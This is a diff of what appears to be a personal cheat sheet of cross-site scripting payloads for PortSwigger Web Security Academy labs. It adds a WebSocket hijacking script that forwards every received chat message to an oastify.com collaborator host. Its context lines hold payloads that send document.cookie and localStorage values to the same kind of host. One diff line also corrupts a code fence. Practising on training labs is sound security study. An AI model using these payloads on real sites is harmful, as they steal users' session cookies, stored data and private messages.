@@ -31,10 +31,24 @@ https://site.com/search?q=
 ```
 <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
 ```
+### [[WebSocket Hijacking]]
+```js
+var ws = new WebSocket("wss://0acb003304fe301e8023033900f900cf.web-security-academy.net/chat");
+
+ws.onopen = () => ws.send("READY");
+
+
+ws.onmessage = function (evt) {
+      console.log("EVNET");
+      var message = evt.data;
+      fetch("https://jzmrsokuzcz3gquw83xz8wqeg5mwanyc.oastify.com", {method: 'POST', mode: 'no-cors', body: evt.data});
+};
+
+```
 ### [[Cookies|Cookie]] Theft
 ```
 <script>var i=new Image;i.src="http://...oastify.com/?"+document.cookie;</script>
-```
+**```
 ### [[Javascript Local Storage]]
 ```
 <script>var i=new Image;i.src="http://...oastify.com/?"+localStorage.getItem("keyname");</script>
